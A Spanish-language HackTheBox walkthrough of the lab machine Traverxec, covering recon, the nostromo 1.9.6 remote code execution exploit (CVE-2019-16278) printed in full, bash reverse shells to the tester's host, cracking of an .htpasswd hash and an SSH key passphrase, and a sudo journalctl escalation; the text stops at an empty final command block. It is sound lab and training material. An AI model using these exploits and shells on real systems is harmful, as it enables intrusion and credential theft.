# HackTheBox - Traverxec


# Setup

Como siempre, necesitamos un espacio comodo para trabajar así que voy a crear mis directorios de trabajo con la función mk que tengo definida en mi Z shell:

<!--more-->

```shell
❯ which mk
mk () {
	mkdir {scans,content,loot,exploits,scripts,report}
}
❯ mk
❯ ls
 content   exploits   loot   report   scans   scripts
```

# Recon

## Identificación de SO 

Vamos a empezar identificando el sistema operativo del objetivo con la función os de mi Z shell:
```shell
❯ which os
os () {
	ttl="$(ping -c 1 $1 | awk -F 'ttl=' '{print $2}' | cut -d ' '  -f 1 | tr -d '\n')"
	if (( $ttl <= 64 ))
	then
		echo 'OS: Unix/Linux'
	elif (( $ttl <= 128 ))
	then
		echo 'OS: Windows'
	else
		echo 'OS: Not detected'
	fi
}
❯ os 10.10.10.165
OS: Unix/Linux
```

Como podemos ver, el sistem operativo del objetivo es Linux.

## nmap

nmap revela que los puertos SSH (TCP 22) y HTTP (TCP 80) estan abiertos:

```shell
❯ sudo nmap -p- -n -Pn --min-rate 5000 -oG scans/nmap-tcpall 10.10.10.165
[sudo] password for wixnic:
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-17 18:11 AST
Nmap scan report for 10.10.10.165
Host is up (0.094s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.52 seconds
❯ which xp
xp () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)"
	echo "[+] Open ports: $ports" >> xp.tmp
	printf $ports | xclip -sel clip
	echo "[+] Ports copied to clipboard" >> xp.tmp
	/usr/bin/bat xp.tmp
	rm xp.tmp
}
❯ xp scans/nmap-tcpall
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: xp.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ [+] Open ports: 22,80
   2   │ [+] Ports copied to clipboard
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ sudo nmap -p22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.165
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-17 18:12 AST
Nmap scan report for 10.10.10.165
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-title: TRAVERXEC
|_http-server-header: nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.14 seconds
```

La versión de OpenSSH revela que la distribución del objetivo pinta ser Debian y que el servicio web es nostromo 1.9.6.

## Sitio Web - HTTP TCP 80

Podemos ver que el nombre del servicio `nostromo 1.9.6` es identificado a través del servicio web con el encabezado o header llamado `Server` del protocolo HTTP:

```http
❯ curl -I 10.10.10.165
HTTP/1.1 200 OK
Date: Sun, 17 Oct 2021 22:19:35 GMT
Server: nostromo 1.9.6
Connection: close
Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT
Content-Length: 15674
Content-Type: text/html
```

> Nota: -I = ¡Obtén solo los encabezados! Los servidores HTTP cuentan con el comando HEAD que se usa para obtener nada más que el encabezado de un documento.

## Shell como www-data

### Investigación de Vulnerabilidades

Usaré searchsploit para encontrar exploits mientras uso el nombre del servicio HTTP que es nostromo, searchsploit muestra tres vulnerabilidades potenciales de Nostromo:

```shell
❯ searchsploit nostromo
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)                                                                                   | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                                                                                                 | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                                                                   | linux/remote/35466.sh
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
❯ searchsploit -m multiple/remote/47837.py
  Exploit: nostromo 1.9.6 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47837
     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
File Type: Python script, ASCII text executable

Copied to: /home/wixnic/htb/traverxec/47837.py
```

Hay uno de metasploit, luego un script de Python y un script de shell. El script de shell es un exploit para una versión anterior, así que lo ignoraremos. Comencemos primero con el exploit de Python.

Código de Python:
```python
# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278

# Esta línea debe comentarse o eliminarse
#cve2019_16278.py

#!/usr/bin/env python

import sys
import socket

art = """

                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/



"""

help_menu = '\r\nUsage: cve2019-16278.py <Target_IP> <Target_Port> <Command>'

def connect(soc):
	# Define una respuesta vacía
    response = ""
    try:
        while True:
			# Defina 1024 bytes como la cantidad de bytes recibidos por el socket.
			# Nota: Para que coincida mejor con las realidades del hardware y la red, el valor de bufsize debe ser una potencia relativamente pequeña de 2, por ejemplo, 4096. En este caso es 2 ^ 10 = 1024
            connection = soc.recv(1024)
			# Si no hay conexión, rompe (termina)
            if len(connection) == 0:
                break
			# Si hay una conexión, agréguela a la variable de response
            response += connection
    # Si no recibe una conexión, pase (continúe)
	except:
        pass
	# Devuelve la respuesta
    return response

def cve(target, port, cmd):
	# Define el socket
    soc = socket.socket()
	# Se conecta a la IP y al PUERTO de destino
    soc.connect((target, int(port)))
	# Define el payload
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
	# Envía el payload a la IP y al PUERTO de destino
    soc.send(payload)
	# Recibe una conexión
    receive = connect(soc)
	# Imprime el valor recibido
    print(receive)

if __name__ == "__main__":

	# Imprime el banner art
    print(art)

    try:
        target = sys.argv[1]
        port = sys.argv[2]
        cmd = sys.argv[3]
		
		# Intenta ejecutar estos 3 argumentos (Ejemplo: 10.10.10.165 80 id)
        cve(target, port, cmd)

	# Si ocurre un error de índice, como no especificar la IP, imprime el menú de ayuda
    except IndexError: 
        print(help_menu)
```

Comenta la línea 10:
```shell
❯ sed '10q;d' 47837.py
#cve2019_16278.py
```

> `NUMq` saldrá inmediatamente cuando el número de línea sea NUM.
> `d` eliminará la línea en lugar de imprimirla; esto se inhibe en la última línea porque la q hace que se omita el resto del script al salir.

Podemos ejecutar con éxito un comando y recibir el resultado:
```shell
❯ python 47837.py 10.10.10.165 80 id


                                        _____-2019-16278
        _____  _______    ______   _____\       _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       |     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  | \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




HTTP/1.1 200 OK
Date: Sun, 17 Oct 2021 22:25:17 GMT
Server: nostromo 1.9.6
Connection: close


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Enviamos una reverse shell:
```shell
python 47837.py 10.10.10.165 80 '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.6/1234 0>&1"'
```

Recibimos la reverse shell con nc en el puerto 1234:
```shell
❯ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.165] 54928
bash: cannot set terminal process group (441): Inappropriate ioctl for device
bash: no job control in this shell
www-data@traverxec:/usr/bin$ whoami
whoami
www-data
www-data@traverxec:/usr/bin$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:50:56:b9:a7:98 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.165/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Alternativamente, podemos hacerlo manual, vamos a leer código de metasploit:
```ruby
def execute_command(cmd, opts = {})
send_request_cgi({
  'method'  => 'POST',
  'uri'     => normalize_uri(target_uri.path, '/.%0d./.%0d./.%0d./.%0d./bin/sh'),
  'headers' => {'Content-Length:' => '1'},
  'data'    => "echo\necho\n#{cmd} 2>&1"
  }
)
end
```

Dado que está haciendo un recorrido de directorio y algo de codificación de la URL probablemente para omitir algunos filtros, y además esta haciandolo en una solicitud POST, podemos intentar hacer esto con curl:

```shell
❯ curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.6/53 0>&1"'
```

Igualmente podemos recibir una shell:
```shell
❯ sudo nc -lnvp 53
listening on [any] 53 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.165] 49166
bash: cannot set terminal process group (441): Inappropriate ioctl for device
bash: no job control in this shell
www-data@traverxec:/usr/bin$
```

## Shell Completamente Interactiva

Podemos habilitar un shell TTY / PTY completo con los siguientes comandos.

En un shell inverso, iniciamos una shell bash \ (elija uno de los siguientes, la idea es generar un shell bash \):

```text
script /dev/null -c bash
python -c 'import pty; pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/bash -i
perl —e 'exec "/bin/bash";'
```

Presionamos Ctrl + Z para salir de la shell y dejarlo ejecutándose en segundo plano, luego en nuestra consola configuramos la TTY con:

```text
stty raw -echo; fg
```

Reiniciamos la shell inversa con:

```text
reset
```

Definimos el tipo de terminal, `xterm` que funciona el 99% de las veces:

```text
> Terminal Type? xterm
```

Ahora habiltamos el clear screen y el movimiento con `xterm` y habilitamos la bash:

```text
export TERM=xterm
export SHELL=bash
```

En otra consola de nuestro host, obtenemos las filas y columnas de la terminal:

```text
stty -a
```

En la shell inversa, configuramos las filas y las columnas, esto arreglará los márgenes de la terminal:

```text
stty rows <num> columns <cols>
```

Ahora confirmamos que estamos en una shell de TTY o PTY con:

```text
tty
```

# Escalada de Privilegios: www-data -> david

## linPEAS

Descargamos linPEAS desde github:

```shell
❯ wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
```

Montamos un HTTP listener:

```shell
❯ sudo python3 -m http.server 80
```

Subimos y corremos linPEAS:

```shell
www-data@traverxec:/dev/shm$ wget  10.10.16.6/linpeas.sh
--2021-10-17 18:33:29--  http://10.10.16.6/linpeas.sh
Connecting to 10.10.16.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 477235 (466K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... .......... 10%  160K 3s
    50K .......... .......... .......... .......... .......... 21%  518K 2s
   100K .......... .......... .......... .......... .......... 32%  298K 1s
   150K .......... .......... .......... .......... .......... 42%  422K 1s
   200K .......... .......... .......... .......... .......... 53%  346K 1s
   250K .......... .......... .......... .......... .......... 64%  422K 1s
   300K .......... .......... .......... .......... .......... 75%  328K 0s
   350K .......... .......... .......... .......... .......... 85%  318K 0s
   400K .......... .......... .......... .......... .......... 96%  330K 0s
   450K .......... ......                                     100% 7.59M=1.4s

2021-10-17 18:33:30 (328 KB/s) - 'linpeas.sh' saved [477235/477235]

www-data@traverxec:/dev/shm$ chmod +x linpeas.sh
www-data@traverxec:/dev/shm$ ./linpeas.sh
```

## .htpasswd

Una de las cosas que descubrió fue un archivo .htpasswd el cual tiene credenciales:

```shell
╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

## Crack .htpasswd

Necesitamos encontrar el módulo que necesitaremos usar para hashcat de esta manera pueda reconocer el hash, en base a la salida podemos ver que el tipo de hash es md5crypt y su número de modo es `500`:

```shell
❯ cat hash.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hash.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ hashcat --example-hashes | grep '\$1\$' -B 2

MODE: 500
TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
HASH: $1$38652870$DUjsu4TTlTsOe/xxZ05uf/
--
MODE: 12200
TYPE: eCryptfs
HASH: $ecryptfs$0$1$4207883745556753$567daa975114206c
--
MODE: 16700
TYPE: FileVault 2
HASH: $fvde$1$16$84286044060108438487434858307513$20000$f1620ab93192112f0a23eea89b5d4df065661f974b704191
--
MODE: 22100
TYPE: BitLocker
HASH: $bitlocker$1$16$6f972989ddc209f1eccf07313a7266a2$1048576$12$3a33a8eaff5e6f81d907b591$60$316b0f6d4cb445fb056f0e3e0633c413526ff4481bbf588917b70a4e8f8075f5ceb45958a800b42cb7ff9b7f5e1
7c6145bf8561ea86f52d3592059fb
```

Ahora que conocemos el modo, podemos intentar descifrar el hash:

```shell
❯ find / -name 'hashcat.potfile' 2>/dev/null
/home/wixnic/.hashcat/hashcat.potfile
❯ echo '' > ~/.hashcat/hashcat.potfile
❯ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt --username --force                                                   
...<SNIP>...
$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
...<SNIP>...
```

También puedes usar john, pero déjame vaciar mi archivo pot primero:

```shell
❯ find / -name 'john.pot' 2>/dev/null
/home/wixnic/.john/john.pot
❯ echo '' > ~/.john/john.pot
```

Ahora podemos usar john:

```shell
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (david)
1g 0:00:00:22 DONE (2021-10-17 18:47) 0.04411g/s 466626p/s 466626c/s 466626C/s Noyoudo..Nous4=5
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Mirando el archivo de configuración de nostromo `nhttpd.conf`:

```shell
www-data@traverxec:$ cd /var/nostromo/conf
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

Podemos ver que este archivo tiene algunos directorios de inicio y uno de ellos es público que apunta a `public_www` y el administrador del servidor es david.


Si leemos la página del manual de [nostromo](https://www.nazgul.ch/dev/nostromo_man.html), podemos ver que en la sección de HOMEDIRS dice lo siguiente:

```shell
HOMEDIRS
     To serve the home directories of your users via HTTP, enable the homedirs
     option by defining the path in where the home directories are stored,
     normally /home.  To access a users home directory enter a ~ in the URL
     followed by the home directory name like in this example:

           http://www.nazgul.ch/~hacki/

     The content of the home directory is handled exactly the same way as a
     directory in your document root.  If some users don't want that their
     home directory can be accessed via HTTP, they shall remove the world
     readable flag on their home directory and a caller will receive a 403
     Forbidden response.  Also, if basic authentication is enabled, a user can
     create an .htaccess file in his home directory and a caller will need to
     authenticate.

     You can restrict the access within the home directories to a single sub
     directory by defining it via the homedirs_public option.
```

Como podemos ver, si la autenticación básica está habilitada, un usuario puede crear un archivo .htaccess. Anteriormente con linPEAS encontramos un archivo .htpasswd y también hemos descifrado su contraseña, por lo que probablemente tengamos usar las credenciales que tenemos.

Podemos intentar ir al directorio de inicio de david, que es `/home/david/public_www`:

```shell
❯ curl 10.10.10.165/~david
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>301 Moved Permanently</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
</head>
<body>

<h1>301 Moved Permanently</h1>

<hr>
<address>nostromo 1.9.6 at 10.10.10.165 Port 80</address>
</body>
</html>
```

Dentro de la carpeta `protected-file-area` podemos ver un archivo comprimido:

```shell
www-data@traverxec:/home/david/public_www/protected-file-area$ ls
backup-ssh-identity-files.tgz
```

Si intentamos ir a este directorio con el servicio web, podemos ver una respuesta `401 Unauthorized`, por lo que necesitamos unas credenciales válidas para autenticarnos en el servicio web usando la URL:

```shell
❯ curl 10.10.10.165/~david/protected-file-area/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>401 Unauthorized</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
</head>
<body>

<h1>401 Unauthorized</h1>

<hr>
<address>nostromo 1.9.6 at 10.10.10.165 Port 80</address>
</body>
</html>         
```

Podemos transferir este archivo con wget o curl siempre que nos autentiquemos en el servicio:

```shell
wget http://david:Nowonly4me@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz
curl http://david:Nowonly4me@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz --output backup-ssh-identity-files.tgz
```

Luego podemos descomprimir su contenido:

```shell
❯ tar -xvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

Hay algunas claves de SSH. Podemos intentar validar si estos pares de claves SSH están autorizados por el servidor verificando si la clave pública `id_rsa.pub` está en el archivo` authorized_keys`:

```shell
❯ cat id_rsa.pub

───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: id_rsa.pub
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsXrsMQc0U71GVXMQcTOYIH2ZvCwpxTxN1jOYbTutvNyYThEIjYpCVs5DKhZi2rNunI8Z+Ey/FC9bpmCiJtao0xxIbJ02c+H6q13aAFrTv61GAzi5neX4Lj2E/pIhd3JBFYRIQw97C
       │ 66MO3UVqxKcnGrCvYnhJvKMw7nSRI/cXTPHAEnwU0+NW2zBKId8cRRLxGFyM49pjDZPsAVgGlfdBD380vVa9dMrJ/T13vDTZZGoDgcq9gRtD1B6NJoLHaRWH4ikRuQvLWjk3nWDDaRjw6MxmRtLk8h0MM7+IiBYc6NJvbQzpG5M5oM0F
       │ vhawQetN71KcZ4jUVxN3m+YkaqHD david@traverxec
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯
❯ cat authorized_keys
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: authorized_keys
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsXrsMQc0U71GVXMQcTOYIH2ZvCwpxTxN1jOYbTutvNyYThEIjYpCVs5DKhZi2rNunI8Z+Ey/FC9bpmCiJtao0xxIbJ02c+H6q13aAFrTv61GAzi5neX4Lj2E/pIhd3JBFYRIQw97C
       │ 66MO3UVqxKcnGrCvYnhJvKMw7nSRI/cXTPHAEnwU0+NW2zBKId8cRRLxGFyM49pjDZPsAVgGlfdBD380vVa9dMrJ/T13vDTZZGoDgcq9gRtD1B6NJoLHaRWH4ikRuQvLWjk3nWDDaRjw6MxmRtLk8h0MM7+IiBYc6NJvbQzpG5M5oM0F
       │ vhawQetN71KcZ4jUVxN3m+YkaqHD david@traverxec
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ diff id_rsa.pub authorized_keys
```

Como podemos ver arriba, la clave pública SSH está en el archivo `authorized_keys`, esto significa que podemos usar la clave privada para autenticarnos en el servicio SSH, pero primero necesitamos descifrar la clave privada SSH ya que está encriptada:

```shell
❯ cat id_rsa
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: id_rsa
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ -----BEGIN RSA PRIVATE KEY-----
   2   │ Proc-Type: 4,ENCRYPTED
   3   │ DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F
   4   │
   5   │ seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
   6   │ tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
   7   │ KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
   8   │ RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
   9   │ HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
  10   │ Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
  11   │ dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
  12   │ 6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
  13   │ xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
  14   │ Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
  15   │ i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
  16   │ fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
  17   │ bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
  18   │ uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
  19   │ Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
  20   │ 9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
  21   │ rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
  22   │ 4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
  23   │ /8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
  24   │ JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
  25   │ XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
  26   │ hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
  27   │ SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
  28   │ j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
  29   │ VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
  30   │ -----END RSA PRIVATE KEY-----
───────┴─────────────────────────────────
```

Podemos usar ssh2john para descifrar la clave privada de SSH:

```shell
❯ find / -name ssh2john.py 2>/dev/null
/usr/share/john/ssh2john.py
❯ python /usr/share/john/ssh2john.py id_rsa > id_rsa.john
❯ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:02 DONE (2021-10-17 19:10) 0.4694g/s 6733Kp/s 6733Kc/s 6733KC/sa6_123..*7¡Vamos!
Session completed
```

La contraseña es `hunter`, por lo que ahora podemos descifrar esta clave y crear una copia de la clave que no está protegida por esta contraseña:

```shell
❯ openssl rsa -in id_rsa -out id_rsa_david
Enter pass phrase for id_rsa:
writing RSA key
```

Alternativamente, pero no se recomienda, ya que no tendrá una copia de la clave descifrada, es simplemente ingresar la frase de la contraseña cuando se le solicite:

```shell
ssh -i id_rsa david@10.10.10.165
```

## Shell via SSH

Ahora que tenemos la clave privada descifrada, podemos usarla para autenticarnos en el servicio SSH como el usuario david:

```shell
❯ ssh -i id_rsa_david david@10.10.10.165
The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established.
ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.165' (ECDSA) to the list of known hosts.
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ id
uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
david@traverxec:~$ cut -c-5 user.txt
7db0b
```

# Escalada de Privilegios: david -> root
## Enumeración

Podemos comenzar enumerando la carpeta de inicio del usuario actual:

```shell
david@traverxec:~$ ls -lahR
<...snip...>
david@traverxec:~$ cat bin/server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

Hay un script que ejecuta sudo en el programa journalctl.

## Abusando journalctl

Si buscamos journalctl en gtfobins (lea gtfobins), hay una opción para sudo. Es bastante breve y simplemente dice:

    sudo journalctl !/bin/sh

El journalctl saldrá a stdout si la cantidad de líneas verticales puede caber en la página actual, de lo contrario, entrará en "less" si no puede. Podemos probar esto en nuestro localhost:

```shell
sudo journalctl
```

Como puedes ver ahora estamos en "less":

```bash
sep 09 20:49:55 parrot kernel: MTRR default type: uncachable
sep 09 20:49:55 parrot kernel: MTRR fixed ranges enabled:
sep 09 20:49:55 parrot kernel:   00000-9FFFF write-back
lines 1-39
```

En el comando journalctl podemos ver el parámetro `-n` que toma `5` líneas como argumento, esto significa que solo se enviarán cinco líneas a la salida, por lo que necesitamos reducir la terminal a algo más pequeño que 5 líneas, y seremos enviados a less como el usuario root porque se esta ejecutando con sudo. Probemos esto en nuestro host primero para ver cómo funciona:

```shell
sudo journalctl -n 5
```

No olvidemos cambiar el tamaño de la terminal (verticalmente).

Sabiendo esto, podemos intentar escalar los privilegios con el comando que se muestra en GTFOBins:

```shell
